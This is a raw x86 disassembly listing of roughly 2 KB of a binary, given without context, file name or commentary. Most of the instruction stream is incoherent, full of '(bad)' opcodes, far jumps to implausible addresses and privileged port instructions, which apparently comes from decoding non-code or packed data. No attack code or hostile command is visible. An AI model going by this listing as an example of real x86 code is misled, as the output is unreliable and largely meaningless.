  4177c4:	outs   dx,BYTE PTR ds:[esi]
  4177c5:	pop    ecx
  4177c6:	imul   eax,DWORD PTR [edi],0x46
  4177c9:	in     al,0xe0
  4177cb:	jg     0x417779
  4177cd:	dec    ebx
  4177ce:	xor    dh,ah
  4177d0:	cmp    DWORD PTR [eax],ecx
  4177d2:	push   edx
  4177d3:	jmp    0x80ab:0x58d47855
  4177da:	sbb    bh,BYTE PTR [esi+ebx*1]
  4177dd:	bnd jnp 0x4177af
  4177e0:	sub    edx,DWORD PTR [eax]
  4177e2:	out    0xc3,al
  4177e4:	fdivr  DWORD PTR [edx+0x3c3fd981]
  4177ea:	stos   DWORD PTR es:[edi],eax
  4177eb:	rcl    DWORD PTR [edi-0xf],cl
  4177ee:	mov    ds:0xb87a4ee8,al
  4177f3:	nop
  4177f4:	call   0x1193fc0f
  4177f9:	dec    esi
  4177fa:	sub    BYTE PTR ds:0x3fe19601,dl
  417800:	mov    dl,BYTE PTR [esi+0x36]
  417803:	xchg   ecx,eax
  417804:	push   ebp
  417805:	cmp    DWORD PTR ds:0x8b80476b,0xffffffef
  41780c:	cmp    ecx,ebp
  41780e:	test   eax,0x3ca771bf
  417813:	imul   edi,esp,0x5e
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
